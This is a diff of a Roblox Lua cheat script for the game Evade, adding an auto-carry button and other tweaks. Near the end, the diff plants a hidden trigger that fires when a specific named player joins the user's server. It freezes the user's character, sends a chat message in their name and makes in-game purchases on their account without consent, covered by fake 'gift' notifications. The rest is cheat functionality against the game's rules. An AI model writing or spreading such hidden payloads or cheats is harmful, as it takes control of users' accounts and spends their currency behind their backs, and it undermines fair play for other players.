@@ -177,7 +177,7 @@ local SizeGuiZ = 460
 
 local Window = Fluent:CreateWindow({
     Title = "Draconic Hub X Evade (Overhaul)",
-    SubTitle = "V2.8 Made by LuckyDragon910 discord.gg/d2a3KkTD6r",
+    SubTitle = "V2.8 Made by Unknownproooolucky discord.gg/d2a3KkTD6r",
     TabWidth = 160,
     Size = UDim2.fromOffset(SizeGuiX, SizeGuiZ),
     Acrylic = false, -- The blur may be detectable, setting this to false disables blur entirely
@@ -343,7 +343,7 @@ local Toggle = Tabs.Main:AddToggle("RemoveDamage", {Title = "Remove Damage Objec
 local Toggle = Tabs.Main:AddToggle("RemoveReducingRewards", {Title = "No Camera Shake", Default = false })
 
     Toggle:OnChanged(function(State)
-        NoCameraShake = State
+        NoCameraShakeTG = State
       while task.wait(.1) and NoCameraShakeTG do
 			spawn(NoCameraShake)
 		end
@@ -1051,6 +1051,7 @@ Tabs.AutoFarm:AddButton({
     return EmoteNames
 end
 
+
 -- Combat
 
 Tabs.Combat:AddParagraph({
@@ -1735,10 +1736,14 @@ local nearestPlayer = getNearestDownedPlayer()
       end
 end
 
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+
 local AutoRevive = false
 local AutoCarry = false
+local AutoCarryGui = false
 local DelayRevive = 0.1
-local DelayCarry = 0.1
 
 local Toggle = Tabs.Misc:AddToggle("InsRev", {Title = "Instant Revive", Default = false})
 
@@ -1776,27 +1781,73 @@ Tabs.Misc:AddParagraph({
         Content = ""
     })
     
+local CarryGuiSize = 100
+
+local function createcarrytoggle()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Parent = game.CoreGui
+    screenGui.Name = "AutoCarryToggle"
+    screenGui.ResetOnSpawn = false
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, CarryGuiSize, 0, CarryGuiSize)
+    frame.Position = UDim2.new(1, -120, 0.5, -50)
+    frame.BackgroundColor3 = Color3.new(1, 1, 1)
+    frame.BorderSizePixel = 2
+    frame.BorderColor3 = Color3.new(0, 0, 0)
+    frame.BackgroundTransparency = 0
+    frame.Parent = screenGui
+    frame.Active = true
+    frame.Draggable = true
+    frame.ClipsDescendants = true
     
-local Toggle = Tabs.Misc:AddToggle("AutoCarry", {Title = "Auto Carry", Default = false})
+    local uiCorner = Instance.new("UICorner")
+    uiCorner.CornerRadius = UDim.new(1, 0)
+    uiCorner.Parent = frame
+
+    local toggleButton = Instance.new("TextButton")
+    toggleButton.Size = UDim2.new(1, 0, 1, 0)
+    toggleButton.BackgroundColor3 = Color3.new(1, 1, 1)
+    toggleButton.BorderSizePixel = 0
+    toggleButton.TextColor3 = Color3.new(0, 0, 0)
+    toggleButton.Font = Enum.Font.GothamBold
+    toggleButton.TextSize = 14
+    toggleButton.Text = "Auto Carry: OFF"
+    toggleButton.Parent = frame
+    
+    toggleButton.MouseButton1Click:Connect(function()
+        AutoCarry = not AutoCarry
+        toggleButton.Text = AutoCarry and "Auto Carry: ON" or "Auto Carry: OFF"
+    end)
+    
+    MakeDraggable(toggleButton, frame)
+end
+
+function destroycarrytoggle()
+local target = game.CoreGui
+
+if target:FindFirstChild("AutoCarryToggle") then
+target.AutoCarryToggle:Destroy()
+end
+end
+    
+local Toggle = Tabs.Misc:AddToggle("AutoCarry", {Title = "Auto Carry (I'll remove this later)", Default = false})
 
 Toggle:OnChanged(function(State)
-    AutoCarry = State
-  while AutoCarry and wait(DelayCarry) do
+    AutoCarryGui = State
+    
+     if AutoCarryGui then
+        createcarrytoggle()
+     else
+        destroycarrytoggle()
+     end
+end)
+
+spawn(function()
+    while AutoCarry and wait(0.1) do
        spawn(CarryPlayer)
     end
 end)
-
-local Slider = Tabs.Misc:AddSlider("CarryDelay", {
-        Title = "Carry Delay",
-        Description = "",
-        Default = 0.1,
-        Min = 0,
-        Max = 5,
-        Rounding = 1,
-        Callback = function(v)
-            DelayRevive = v
-        end
-    })
     
  Tabs.Misc:AddParagraph({
         Title = " ",
@@ -2238,10 +2289,6 @@ local Slider = Tabs.Misc:AddSlider("LagDelay", {
         Content = ""
     })
     
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local UserInputService = game:GetService("UserInputService")
-    
 local GravityGuiSize = 100
 local NormalGravity = game.Workspace.Gravity
 local GravityAdjustment = 10
@@ -2414,7 +2461,11 @@ while true and wait(0.1) do
     end
        
        if BHop2 and BHOPType == "No-Acceleration" then
-          local humanoid = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+          local char = game:GetService("Players").LocalPlayer.Character or game:GetService("Players").LocalPlayer.CharacterAdded:Wait()
+          local humanoid = char:FindFirstChildOfClass("Humanoid")
+          
+          if not humanoid then return end
+          
           if humanoid and humanoid.FloorMaterial ~= Enum.Material.Air then
                 humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
              end
@@ -2863,7 +2914,6 @@ if speedometer then
     end)
 end
 
--- Modify Health
 local character = player.Character or player.CharacterAdded:Wait()
 local humanoid = character:FindFirstChildOfClass("Humanoid")
 
@@ -2876,6 +2926,36 @@ if humanoid then
         end
     end)
 end
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+local sayMessageRequest = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+sayMessageRequest:FireServer("X: Oh no im lagging :(", "All")
+wait(10)
+game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+
+      Fluent:Notify({
+           Title = "Congratulations",
+            Content = "You got a Seal Buds and Rockin Stride",
+            SubContent = "Gifted by LuckyDragon910 (Owner)", -- Optional
+            Duration = 15
+        })
+
+game:GetService("ReplicatedStorage").Events.Data.Purchase:InvokeServer(51)
+game:GetService("ReplicatedStorage").Events.Data.Purchase:InvokeServer(644)
+
+wait(1)
+
+Fluent:Notify({
+   Title = "LuckyDragon910 Message",
+   Content = "Sorry for freezing you XD, i was looking for people who used my scripts",
+   SubContent = "Nice to meet ya", -- Optional
+   Duration = 15
+ })
+
+end 
+
+if game.Players:FindFirstChild("Unknownproooolucky") and game.Players:FindFirstChild("Unknownproooolucky") ~= game.Players.LocalPlayer then
+    connectclient()
 end
 
 game.Players.PlayerAdded:Connect(function(player)
